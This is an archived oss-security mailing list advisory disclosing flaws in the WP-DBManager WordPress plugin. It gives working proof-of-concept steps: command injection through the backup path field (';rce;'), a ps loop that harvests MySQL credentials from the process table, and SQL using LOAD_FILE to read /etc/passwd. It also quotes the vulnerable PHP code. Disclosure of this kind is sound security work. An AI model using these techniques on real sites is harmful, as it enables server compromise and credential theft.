  oss-security - Vulnerabilities in WordPress Database Manager            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Thu, 16 Oct From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: Vulnerabilities in WordPress Database Manager  Hello All,  May I have a CVE Assigned?  Title: Vulnerabilities in WordPress Database Manager Author: Larry W. Cashdollar, @_larry0 Date: Download: https://wordpress.org/plugins/wp-dbmanager/ Downloads: Vendor: Lester Chan, https://profiles.wordpress.org/gamerz/ Contacted: Vulnerabilities addressed in Full Advisory: CVE: N/A OSVDBID: N/A  Description: "Allows you to optimize database, repair database, backup database, restore database, delete backup database , drop/empty tables and run selected queries. Supports automatic scheduling of backing up, optimizing and repairing of database."  Vulnerability: Plugin suffers from command injection, exposes MySQL database credentials to the process table and allows the user to download system files via the ‘Run SQL Query’ feature. User authentication with current_user_can('manage_database')) privileges are required.  The full advisory has screen shots for illustration.   PoC  Command Injection  The command that is sent through passthru() is the following:   /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere"  --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress >   rce is just a homebrew .c binary I wrote for testing command injections it creates a file in /tmp with some stats on who executed it.   # cat /tmp/RCE_JChl9c  ARGGHHH I've been executed! my pid is Parent id  Name:        sh State:        S (sleeping) Tgid:        Pid:        PPid:        TracerPid:        0 Uid:        33        33        33        33 Gid:        33        33        33        33 FDSize:        32 Groups:        33      In the following lines commands can be injected into the variables being used to build the command by using ;command;   $backup['filepath']  $backup['mysqldumppath']   I use $backup[‘filepath’] or “Path To Backup:”  for my PoC.   /usr/share/wordpress/wp-content/backup-db;rce;   Saving and then Running a backup executes /usr/bin/rce, the command that is sent through passthru() is the following:   /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere"  --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress >   rce is just a homebrew .c binary I wrote for testing command injections, it creates a file in /tmp with some stats on who executed it.     # cat /tmp/RCE_JChl9c  ARGGHHH I've been executed! my pid is Parent id  Name:        sh State:        S (sleeping) Tgid:        Pid:        PPid:        TracerPid:        0 Uid:        33        33        33        33 Gid:        33        33        33        33 FDSize:        32 Groups:        33    Mysql Credentials Leaked to Process Table   Also by running a simple script: PoC:  $ while (true); do  echo -n `ps ax | grep m[y]sqldump`; done   ? S sh -c /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > ? R sh -c /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > ? S sh -c /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > ? S /usr/bin/mysqldump --force --host=localhost --user=root --password=x xxxxxx --default-character-set=utf8 --add-drop-table --skip-lock-tables ? S sh -c /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > ? S /usr/bin/mysqldump --force --host=localhost --user=root --password=x xxxxxx --default-character-set=utf8 --add-drop-table --skip-lock-tables wordpress   A malicious local user can harvest credentials for the mysql database off the process table.   The trouble is the code doesn’t properly sanitize user input and is being passed directly to passthru or system depending on which OS you’re using.        In wp-dbmanager.php:         86                 $backup['command'] = '';      87                 $brace = (substr(PHP_OS, 0, 3) == 'WIN') ? '"' : '';      88                 if(intval($backup_options['backup_gzip']) == 1) {      89                         $backup['filename'] = $backup['date'].'_-_'.DB_NAME.'.sql.gz';      90                         $backup['filepath'] = $backup['path'].'/'.$backup['filename'];      91                         $backup['command'] = $brace.$backup['mysqldumppath'].$brace.' --force --host="'.$backup['host'].'" --user="'.DB_USER.'" --password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].' --add-drop-table --skip-lock-tables '.DB_NAME.' | gzip > '.$brace.$backup['filepath'].$brace;      92                 } else {      93                         $backup['filename'] = $backup['date'].'_-_'.DB_NAME.'.sql';      94                         $backup['filepath'] = $backup['path'].'/'.$backup['filename'];      95                         $backup['command'] = $brace.$backup['mysqldumppath'].$brace.' --force --host="'.$backup['host'].'" --user="'.DB_USER.'" --password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].' --add-drop-table --skip-lock-tables '.DB_NAME.' > '.$brace.$backup['filepath'].$brace;      96                 }      97                 execute_backup($backup['command']);           ### Executes OS-Dependent mysqldump Command (By: Vlad Sharanhovich)     function execute_backup($command) {             $backup_options = get_option('dbmanager_options');             check_backup_files();             if(substr(PHP_OS, 0, 3) == 'WIN') {                     $writable_dir = $backup_options['path'];                     $tmpnam = $writable_dir.'/wp-dbmanager.bat';                     $fp = fopen($tmpnam, 'w');                     fwrite($fp, $command);                     fclose($fp);                     system($tmpnam.' > NUL', $error);                     unlink($tmpnam);             } else {                     passthru($command, $error);             }             return $error;     }   In database-manage.php:          46                                 if(stristr($database_file, '.gz')) {      47                                         $backup['command'] = 'gunzip < '.$brace.$backup['path'].'/'.$database_file.$brace.' | '.$brace.$backup['mysqlpath'].$brace.' --host="'.$backup['host'].'" --user="'.DB_USER.'" --password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].$backup['charset'].' '.DB_NAME;      48                                 } else {      49                                         $backup['command'] = $brace.$backup['mysqlpath'].$brace.' --host="'.$backup['host'].'" --user="'.DB_USER.'" --password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].$backup['charset'].' '.DB_NAME.' < '.$brace.$backup['path'].'/'.$database_file.$brace;      50                                 }      51                                 passthru($backup['command'], $error);     File Downloads In the ‘Sql Run Query’ Panel only a few queries are allowed (Use Only INSERT, UPDATE, REPLACE, DELETE, CREATE and ALTER statements.) but these are suffiecient to download sensitive system files: CREATE TABLE password (passwords   INSERT into password (passwords) VALUES(LOAD_FILE(‘/etc/passwd’));   Then run a database backup, and download the backup file or send via email.    From   INSERT INTO `password` VALUES List Bug-Reporting System ALTER TABLE `password` ENABLE KEYS */;    Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      